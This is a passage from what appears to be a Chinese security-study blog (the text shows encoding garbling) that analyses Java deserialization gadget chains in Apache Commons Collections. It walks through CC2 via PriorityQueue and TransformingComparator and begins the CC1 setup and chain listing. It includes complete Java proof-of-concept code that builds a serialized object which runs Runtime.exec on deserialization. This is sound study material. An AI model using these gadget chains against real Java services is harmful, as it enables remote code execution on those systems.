alt="QQæˆªå›¾20220303211048"></p><p><strong>PriorityQueue</strong>å°±ç›¸å½“äºä»£æ›¿äº†cc1ä¸­çš„<strong>AnnotationInvocationHandler</strong>ã€‚å…ˆç»§ç»­è·Ÿè¿›å…¥<strong>heapify()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235455.png" alt="QQæˆªå›¾20220303211540"></p><p>ç„¶åç»§ç»­è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235683.png" alt="QQæˆªå›¾20220303211553"></p><p>ç„¶åçœ‹çœ‹è¿™ä¸¤ä¸ªåœ°æ–¹ã€‚å‘ç°è¿™é‡Œçš„<strong>siftDownUsingComparator()<strong>é‡Œé¢è°ƒç”¨äº†</strong>comparator.compare</strong>ã€‚è€Œè¿™é‡Œå‡‘å·§çš„å°±æ˜¯ <strong>TransformingComparator</strong><br>å®ç°äº† <strong>compare</strong>æ¥å£ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235792.png" alt="QQæˆªå›¾20220303211839"></p><p>å¹¶ä¸”è°ƒç”¨äº†<strong>transform</strong>ã€‚åç»­å°±è·Ÿcc1ï¼Œå·®ä¸å¤šã€‚<br>ä¸€ä¸ªä¸€ä¸ªåˆ†æã€‚</p><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br></code></pre></td></tr></table></figure><p>ä¼ å…¥å°±å¯ï¼Œåç»­ç›´æ¥è°ƒç”¨<strong>transform</strong></p><h2 id="heapify"><a href="#heapify" class="headerlink" title="heapify()"></a>heapify()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>          siftDown(i, (E) queue[i]);<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ¤æ–­äº†size&gt;&gt;&gt;1ã€‚æ‰èƒ½è¿›å…¥  <strong>siftDown(i, (E) queue[i]);</strong></p><h2 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown()"></a>siftDown()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>      <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>          siftDownUsingComparator(k, x);<br>      <span class="hljs-keyword">else</span><br>          siftDownComparable(k, x);<br>  &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸ºäº†è¿›å…¥ <strong>siftDownUsingComparator(k, x)<strong>è¦ä¿è¯</strong>comparator</strong>ä¸å¯ä»¥ä¸ºç©ºã€‚<br>å¹¶ä¸”è¿™é‡Œä¼ å…¥çš„å€¼ä¸èƒ½å°äº1ã€‚ä¸ç„¶è¿™é‡Œä¼šæŠ¥é”™ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236941.png" alt="QQæˆªå›¾20220303214616"></p><p>æ‰€ä»¥æ„é€ ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br></code></pre></td></tr></table></figure><h2 id="POCï¼ˆæ®‹ç¼ºï¼‰"><a href="#POCï¼ˆæ®‹ç¼ºï¼‰" class="headerlink" title="POCï¼ˆæ®‹ç¼ºï¼‰"></a>POCï¼ˆæ®‹ç¼ºï¼‰</h2><p>è¿™æ ·å°±æ˜¯æ˜¯æ²¡æœ‰ååºåˆ—åŒ–ä¹Ÿèƒ½è¿›è¡Œå¼¹è®¡ç®—å™¨ï¼Œè¿˜å¼¹äº†è¿ä¸ªã€‚emmmâ€¦</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, transformingComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        serialize(priorityQueue);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="é—®é¢˜-æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚"><a href="#é—®é¢˜-æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚" class="headerlink" title="é—®é¢˜ æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚"></a>é—®é¢˜ æ²¡æœ‰ç»è¿‡ååºåˆ—åŒ–ä»èƒ½å¼¹å‡ºè®¡ç®—å™¨ã€‚</h2><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¯¦ç»†è·Ÿä¸€ä¸‹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235678.png" alt="QQæˆªå›¾20220303221145"></p><p>åœ¨è·Ÿå¦‚addä¹‹åï¼Œè¿™é‡Œçš„size&#x3D;2ï¼Œç„¶åç»§ç»­è·Ÿè¿›<strong>siftUpï¼ˆï¼‰</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032214484.png" alt="QQæˆªå›¾20220303221246"></p><p>ç»§ç»­è·Ÿè¿›ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032235283.png" alt="QQæˆªå›¾20220303221535"></p><p>ç»§ç»­ã€‚ç„¶åäº§ç”Ÿäº†ä¸¤æ¬¡<strong>transform</strong>ï¼Œæ‰§è¡Œäº†ä¸¤æ¬¡ä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032215085.png"></p><p>å¯ä»¥è¯•è¯•<strong>siftUpComparable</strong></p><h2 id="siftUpComparable"><a href="#siftUpComparable" class="headerlink" title="siftUpComparable"></a>siftUpComparable</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203032236883.png" alt="QQæˆªå›¾20220303222405"></p><p>å¯æƒœæœ€åè·Ÿäº†ä¸€éï¼Œç›´æ¥æ²¡æœ‰è°ƒç”¨**compare()**ã€‚</p><h2 id="ç ´å±€"><a href="#ç ´å±€" class="headerlink" title="ç ´å±€"></a>ç ´å±€</h2><p>åå°„ï¼<br>ç›´æ¥åé¢åœ¨ç»™ <strong>PriorityQueue</strong>æ·»åŠ <strong>comparator</strong>å‚æ•°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ã€‚æˆ‘ä¸€ç›´åœ¨fornameé‡Œé¢çº ç»“ã€‚ä¸€ç›´å¡«æˆè¿™ä¸ªï¼ˆjava.util.function.Consumer.PriorityQueueï¼‰ï¼Œåç»­åœ¨ï¼ˆå†™pocçš„é¡µé¢æ‰çœ‹åˆ°<code>import java.util.PriorityQueue;</code>ï¼Œemmmæ„Ÿè§‰è‡ªå·±æœ‰ç‚¹ç¬¨ã€‚ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span> );<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,transformingComparator);<br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>       <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>       <span class="hljs-keyword">return</span> o;<br>   &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections1</title>
    <link href="/2022/03/03/CommonsCollections1/"/>
    <url>/2022/03/03/CommonsCollections1/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>jdk8u71ä¹‹åä¿®å¤äº†æ¼æ´</strong></p><p>è¿™æ˜¯æˆ‘ç”¨çš„ç‰ˆæœ¬ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725224.png" alt="QQæˆªå›¾20220302152210"></p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p><strong>æ¼æ´ç‰ˆæœ¬ï¼šApache-Commons-Collections&lt;&#x3D;3.1</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725366.png" alt="QQæˆªå›¾20220302151835"></p><h3 id="sun-reflect-annotation"><a href="#sun-reflect-annotation" class="headerlink" title="sun.reflect.annotation"></a>sun.reflect.annotation</h3><p>è¿™ä¸ªåŒ…æˆ‘ä»¬è¦è‡ªè¡Œå¯¼å…¥ã€‚ï¼ˆå¯¹åº”æ‰¾åˆ°ç‰ˆæœ¬ï¼‰<br><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><p>æ‰¾åˆ°jdkç‰ˆæœ¬ï¼Œè§£å‹ç¼©src.zip<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021539384.png" alt="QQæˆªå›¾20220302153927"></p><p>ç„¶åå°†ä¸‹è½½çš„å‹ç¼©åŒ…ï¼Œæ‰¾åˆ°sunæ–‡ä»¶å¤¹ï¼ŒåŠ å…¥è‡³srcã€‚å³å¯ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725733.png" alt="QQæˆªå›¾20220302153927"></p><p>ç„¶åå°±æ˜¯åœ¨ideaä¸­å¯¼å…¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725699.png" alt="QQæˆªå›¾20220302154312"></p><p>æ¬§å…‹ï¼<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725960.png" alt="QQæˆªå›¾20220302154736"></p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">objectInputStream.read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="transform"><a href="#transform" class="headerlink" title="transform"></a>transform</h3><p>æœ€å¤šçš„å°±æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œè¿›å»ç§ç§ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021616758.png" alt="QQæˆªå›¾20220302161553"></p><p>ä»ä¸Šå¾€ä¸‹çœ‹åˆ©ç”¨é“¾å­ã€‚ï¼ˆæŒ‡å®ç°äº†transformæ¥å£çš„ï¼‰</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203021622247.png" alt="QQæˆªå›¾20220302162237"></p><p><strong>ä¼ å…¥çš„æ•°ç»„ï¼Œåœ¨transformæ–¹æ³•ä¸­ï¼Œå‰ä¸€æ¬¡transformå‡½æ•°çš„è¿”å›å€¼ï¼Œä¼šä½œä¸ºä¸‹ä¸€æ¬¡transformå‡½æ•°çš„objectå‚æ•°è¾“å…¥ã€‚</strong></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203031725974.png" alt="QQæˆªå›¾20220302162414"></p><p>ç»™äº†ä»€ä¹ˆå°±è¿”å›ä»€ä¹ˆã€‚</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" 